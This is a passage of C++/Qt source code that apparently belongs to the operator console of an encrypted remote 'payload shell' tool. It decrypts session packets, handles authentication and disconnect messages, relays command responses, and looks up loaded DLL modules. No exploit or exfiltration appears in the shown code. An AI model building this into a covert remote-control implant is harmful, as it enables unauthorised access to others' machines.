      if (!PayloadShellDecrypt(Packet, Session->SessionKey, &Plaintext,
                               &Error)) {
        PayloadShellLog(Session, "Receive failed: " + Error, QColor("#FF5F56"));
        if (Session->Socket)
          Session->Socket->disconnectFromHost();
        return;
      }

      const QString Response = QString::fromUtf8(Plaintext);
      if (Session->Authenticating) {
        Session->Authenticating = false;
        if (Response == "AUTH_OK") {
          PayloadShellLog(Session, "Connected!", QColor("#27C93F"));
          PayloadShellSetStatus(Session, "Connected", QColor("#27C93F"));
          if (Session->CommandEdit)
            Session->CommandEdit->setFocus();
        } else {
          PayloadShellLog(Session, "Auth failed: " + Response,
                          QColor("#FF5F56"));
          PayloadShellSetStatus(Session, "Auth failed", QColor("#FF5F56"));
          if (Session->Socket)
            Session->Socket->disconnectFromHost();
        }
        PayloadShellUpdateControls(State);
        continue;
      }

      const QString PendingCommand = Session->PendingCommand;
      Session->PendingCommand.clear();
      PayloadShellUpdateControls(State);
      if (Response == "BYE") {
        PayloadShellLog(Session, "Server closed connection.",
                        QColor("#4FC3F7"));
        if (Session->Socket)
          Session->Socket->disconnectFromHost();
        return;
      }
      PayloadShellHandleResponse(Session, PendingCommand, Response);
      continue;
    }

    return;
  }
}

ModuleEntry *FindDllModule(const QString &Path) {
  const auto Match = std::find_if(
      DllModules.begin(), DllModules.end(), [&Path](const ModuleEntry &Module) {
        return QString::fromStdString(Module.Path) == Path;
      });
  return Match == DllModules.end() ? nullptr : &*Match;
}

std::wstring WidePath(const QString &Path) { return Path.toStdWString(); }
